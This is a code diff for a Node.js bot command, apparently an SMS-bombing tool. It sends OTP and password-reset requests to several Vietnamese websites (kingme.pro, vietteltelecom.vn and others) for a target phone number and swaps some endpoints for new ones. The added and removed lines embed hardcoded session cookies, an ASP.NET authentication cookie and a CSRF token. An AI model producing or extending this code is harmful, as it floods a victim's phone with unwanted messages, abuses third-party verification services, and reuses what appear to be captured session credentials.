@@ -165,89 +165,43 @@ module.exports = {
       'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
     };
 
-        const vayVndCookies = {
-      '_tt_enable_cookie': '1',
-      '_ttp': 'UrWHpav-jlIIAkZIKfuHiWzvo3q',
-      '_ym_uid': '1690890718761379945',
-      '_ym_d': '1693615052',
-      '_fbp': 'fb.1.1699102383332.1544435954',
-      '_gcl_aw': 'GCL.1703856886.CjwKCAiA-bmsBhAGEiwAoaQNmqO3t9IJpw6h-bBXl_eMY2Y3ub9vjq6y1Nf84DY1MGEdS4Zw5rISzRoC00kQAvD_BwE',
-      '_gcl_au': '1.1.667368353.1703856886',
-      '_ga_P2783EHVX2': 'GS1.1.1703856890.5.0.1703856890.60.0.0',
-      '_ym_isad': '1',
-      '_ga': 'GA1.2.1456721416.1693615049',
-      '_gid': 'GA1.2.84320069.1703856892',
-      '_gac_UA-151110385-1': '1.1703856892.CjwKCAiA-bmsBhAGEiwAoaQNmqO3t9IJpw6h-bBXl_eMY2Y3ub9vjq6y1Nf84DY1MGEdS4Zw5rISzRoC00kQAvD_BwE',
-      '_ym_visorc': 'w',
-    };
+const kingMeHeaders = {
+  'authority': 'kingme.pro',
+  'accept': '*/*',
+  'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
+  'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+  'cookie': '__RequestVerificationToken=wLji7PALv76EqA41fCZ0iRJju9NJHvzMkr3ra5BSMXafv_gjLvq4xx7SRagVJ3uL9O0ZDtZld1TsmYKGYU3XUkuVjfI1; ASP.NET_SessionId=yo3axja3srqd4qapzd0bfkrg; UrlRefer=2gg061902; _gid=GA1.2.527718006.1699094428; _gat_gtag_UA_138230112_4=1; comm100_guid2_100014013=yCSs5Di-nEeZ0KXurvHXZA; _ga=GA1.2.1588581150.1699094427; .AspNet.ApplicationCookie=4Psabhtu-g997cCpn-0tWsIZTCshDocNG7Bw5ejOT1znQxXfomOuVMydDGFhS27fjtWzETZADUFBpFYih_CpbHw7W3gLbYXoRv0EMonPpWwiI3utDh1EAPO5tYUlsy0KB9tPwd9RlV-gv08OMEWHOKsEdsjlRGkR5I8qZVc6uAS4LCx9O48tGFpP1JRm1M1AW6c5M6xKpDJTeP_QYTA0d2M_M0ViJ3-KkDB3lbF-6r9M5oNhRAva8wVFOprOr1i0NK1_78SZrF0d11EymXKZs7vtXeS0_1lcNyPoRU8sYj9glOI5YjGdLE0iPMd7MLiNUZlXl-H0nedMZ8LF4829V-WaA9gRMiF4PJnQTJlsI1ItqlrepQ1zuv-p1IYjmag0C34Sx_67Y_csQ_n-u0FzE39dr44JKNv-LXRjtx9VpthaWSyDjHSynKWSeqKhp8Z-pUiEbj5d7QtKDIzg9x57-ukz7JKnePDefvWNP2MYVSK7ih_EMKm-z9oKcnbMnsOMS2rM0jA3Xjw9XwNm6QrgCchx5sid6RNURUPm3vmC3meqZ96M5sKKqGQoHPRdub235PH-LOnO5gtg1ZVPhjF9Ym6fH2bOsIUVsUKf9MyOIUBvOxND; _ga_PLRPEKN946=GS1.1.1699094427.1.1.1699094474.0.0.0',
+  'dnt': '1',
+  'origin': 'https://kingme.pro',
+  'referer': 'https://kingme.pro/',
+  'sec-ch-ua': '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
+  'sec-ch-ua-mobile': '?0',
+  'sec-ch-ua-platform': '"Windows"',
+  'sec-fetch-dest': 'empty',
+  'sec-fetch-mode': 'cors',
+  'sec-fetch-site': 'same-origin',
+  'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
+  'x-requested-with': 'XMLHttpRequest',
+};
 
-    const vayVndHeaders = {
-      'authority': 'api.vayvnd.vn',
-      'accept': 'application/json',
-      'accept-language': 'vi-VN',
-      'content-type': 'application/json; charset=utf-8',
-      'dnt': '1',
-      'origin': 'https://vayvnd.vn',
-      'referer': 'https://vayvnd.vn/',
-      'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
-      'sec-ch-ua-mobile': '?0',
-      'sec-ch-ua-platform': '"Windows"',
-      'sec-fetch-dest': 'empty',
-      'sec-fetch-mode': 'cors',
-      'sec-fetch-site': 'same-site',
-      'site-id': '3',
-      'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-    };
+const kingMeData = {
+  msisdn: phone,
+};
 
-    const vayVndData = {
-      'login': phone,
-      'trackingId': 'h9vBHoAE9KcJ7xX6GF8sfN7hHxryAIwl28zt6ycjTI8JhfdLlE1fHyGTqQmw8AMN',
-    };
-
-    const fptShopCookies = {
-      'log_6dd5cf4a-73f7-4a79-b6d6-b686d28583fc': '49eb18d9-d110-4043-8ad4-7275d8b8d2e7',
-      '_gcl_au': '1.1.810434433.1689606249',
-      'fpt_uuid': '%226a6dc316-0db3-44a0-8891-224623887942%22',
-      'ajs_group_id': 'null',
-      '_tt_enable_cookie': '1',
-      '_ttp': '8uDshq4oYRcpPmQFUdKlNsoewGP',
-      '__admUTMtime': '1689606251',
-      '__uidac': '9d45aa00b705e4c9ff20708ca0955e4f',
-      '__iid': '',
-      '__su': '0',
-      '_gid': 'GA1.3.1682465247.1691155413',
-      '_gat': '1',
-      '_ga': 'GA1.1.1211624965.1689606248',
-      'vMobile': '1',
-      '__zi': '3000.SSZzejyD7iu_cVEzsr0LpYAPvhoKKa7GR9V-_yX0Iyz-rUpftKyLnd-SeEpVIXt1DvokvPf97yizcQtaDp0.1',
-      'cf_clearance': 'm4Jw8L0YfcX1sOo1SwE_jMGACjNFcJ0fu_5BSusrDew-1691155422-0-1-386b1bcb.29faee9a.6f6a442b-0.2.1691155422',
-      '_hjSessionUser_731679': 'eyJpZCI6ImIzZDQ0ZDBlLTFlMTUtNThhNS1iNzU1LWM5ODdjZmYzMTkxMyIsImNyZWF0ZWQiOjE2ODk2MDYyNTIyMTEsImV4aXN0aW5nIjp0cnVlfQ==',
-      '_hjIncludedInSessionSample_731679': '0',
-      '_hjSession_731679': 'eyJpZCI6ImJkOTcxOTVjLTM1Y2EtNDg1OC1hMDA1LTFmOWIxYzc3M2VjNiIsImNyZWF0ZWQiOjE2OTExNTU0MTg5NjksImluU2FtcGxlIjpmYWxzZX0=',
-      '_ga_ZR815NQ85K': 'GS1.1.1691155413.2.0.1691155423.50.0.0',
-    };
-
-    const fptShopHeaders = {
-      'Accept': '*/*',
-      'Accept-Language': 'en-US,en;q=0.9,vi;q=0.8',
+    const viettelHeaders = {
+      'Host': 'vietteltelecom.vn',
       'Connection': 'keep-alive',
-      'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
-      'DNT': '1',
-      'Origin': 'https://fptshop.com.vn',
-      'Referer': 'https://fptshop.com.vn/',
-      'Sec-Fetch-Dest': 'empty',
-      'Sec-Fetch-Mode': 'cors',
-      'Sec-Fetch-Site': 'same-origin',
-      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
-      'X-Requested-With': 'XMLHttpRequest',
-      'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
-      'sec-ch-ua-mobile': '?0',
-      'sec-ch-ua-platform': '"Windows"',
+      'X-CSRF-TOKEN': 'mXy4RvYExDOIR62HlNUuGjVUhnpKgMA57LhtHQ5I',
+      'User-Agent': 'Mozilla/5.0 (Linux; Android 10; RMX3063) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36',
+      'Content-Type': 'application/json;charset=UTF-8',
+      'Accept': 'application/json, text/plain, */*',
+      'Referer': 'https://vietteltelecom.vn/dang-nhap',
     };
-
-    const fptShopData = new URLSearchParams();
-    fptShopData.append('phone', phone);
-    fptShopData.append('typeReset', '0');
+    
+    const viettelData = {
+      phone: phone,
+      type: ''
+    };
 
 
     // Initial message to be edited later
@@ -291,8 +245,9 @@ module.exports = {
           headers: kavayHeaders,
           cookies: kavayCookies
         }), 
-        axios.post('https://api.vayvnd.vn/v2/users/password-reset', vayVndData, { headers: vayVndHeaders, cookies: vayVndCookies }), 
-        axios.post('https://fptshop.com.vn/api-data/loyalty/Login/Verification', fptShopData, { headers: fptShopHeaders, cookies: fptShopCookies })
+        axios.post('https://kingme.pro/vi/Otp/SendOtpVerifyPhoneNumber', kingMeData, { headers: kingMeHeaders }), 
+        axios.post('https://vietteltelecom.vn/api/get-otp-login', viettelData, { headers: viettelHeaders })
+
       ])
       .then(() => {
         successCount += 8;
